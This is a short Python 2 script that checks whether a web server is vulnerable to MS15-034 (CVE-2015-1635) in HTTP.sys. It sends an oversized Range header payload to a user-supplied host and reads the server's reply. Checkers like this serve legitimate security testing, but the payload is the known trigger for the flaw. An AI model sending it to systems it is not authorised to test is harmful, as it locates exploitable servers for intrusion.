# http_sys_checker.py
# CVE-2015-1635
# description: Checks if the host is vulnerable to MS15-034
# reference: https://technet.microsoft.com/en-us/library/security/ms15-034.aspx
# author: @shipcod3

import sys, requests, time

def main():

    payload = "bytes=18-18446744073709551615"
    print 'Set RHOST:',
    rhost = raw_input()
    print 'Set PATH / DIRECTORY:',
    path = raw_input()
    print ""
    print "[****] Starting HTTP.sys (MS15-034) Checker"
    time.sleep(2)

    try:
        r = requests.get("http://{}/{}".format(rhost, path), headers={"Range": payload})
        print "[+] Sending the payload: " + payload + " in Range header"

        if r.status_code == 416 and 'Requested Range Not Satisfiable' in r.reason:
            print "[-] Vulnerable"

        elif 'The request has an invalid header name' in r.reason:
            print "[+] Not Vulnerable - Patched"

        else:
            print "[+] Not Vulnerable"

    except Exception as e:
        print "Error! Check if host is online.."

if __name__ == "__main__":
    main()
